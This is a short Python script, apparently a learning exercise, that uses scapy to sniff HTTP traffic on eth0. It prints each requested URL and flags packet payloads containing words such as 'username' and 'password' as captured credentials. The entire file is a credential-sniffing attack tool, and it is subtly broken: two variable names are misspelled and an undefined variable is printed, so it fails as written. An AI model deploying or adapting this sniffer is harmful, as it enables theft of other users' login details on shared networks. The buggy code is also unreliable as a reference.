import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store = False, prn=process_sniffed_packet, filter = '')


def get_url(packet):
    return packet[http.HTTPRequest].Host + pakcet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packer[scapy.Raw].load)
        keywords = ['username', 'user', 'login', 'password', 'pass']

        for i in keywords:
            if i in load:
                return load
 
 

    
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url = get_url(packet)
        print('[+] HTTP Request >> ' + url.decode())

        login_info = get_login_info(packet)
        if login_info:
            print('\n\n[+] Possible username/password >>' + load + '\n\n')
        
sniff('eth0')
